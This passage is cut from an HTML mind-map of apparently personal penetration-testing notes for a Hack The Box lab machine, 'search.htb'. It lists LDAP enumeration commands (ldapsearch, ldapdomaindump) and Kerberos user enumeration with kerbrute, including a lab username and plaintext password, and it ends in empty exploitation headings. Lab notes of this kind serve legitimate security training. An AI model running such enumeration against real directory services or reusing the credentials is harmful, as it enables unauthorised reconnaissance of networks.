namingcontexts</code>"},{"type":"list_item","depth":4,"payload":{"lines":[998,999]},"content":"<code>ldapsearch -h $RHOST -x -b &quot;DC=search,DC=htb&quot;</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[1000,1001]},"content":"ldapsearch (Authenticated)","children":[{"type":"list_item","depth":4,"payload":{"lines":[1001,1002]},"content":"<code>ldapsearch -h 10.10.11.129 -D 'hope.sharp@search.htb' -w &quot;IsolationIsKey?&quot; -b &quot;DC=search,DC=htb&quot;</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[1003,1004]},"content":"ldapdomaindump - Visualize LDAP data","children":[{"type":"list_item","depth":4,"payload":{"lines":[1004,1005]},"content":"<code>ldapdomaindump -u search.htb\\\\hope.sharp -p 'IsolationIsKey?' 10.10.11.129 -o ldap/</code>"},{"type":"list_item","depth":4,"payload":{"lines":[1005,1006]},"content":"<code>ls ldap/</code>"}]},{"type":"heading","depth":3,"payload":{"lines":[1007,1008]},"content":"kerbrute","children":[{"type":"list_item","depth":4,"payload":{"lines":[1008,1009]},"content":"<code>kerbrute userenum --dc $RHOST -d search.htb users.txt</code>"}]}]},{"type":"heading","depth":2,"payload":{"lines":[1010,1011]},"content":"Exploitation"}]},{"type":"heading","depth":1,"payload":{"lines":[1014,1015]},"content":"PORT » SERVICE","children":[{"type":"heading","depth":2,"payload":{"lines":[1015,1016]},"content":"Enumeration"},{"type":"heading","depth":2,"payload":{"lines":[1016,1017]},"content":"Exploitation"}]}]},{"colorFreezeLevel":3,"initialExpandLevel":2})</script>
</body>
</html>
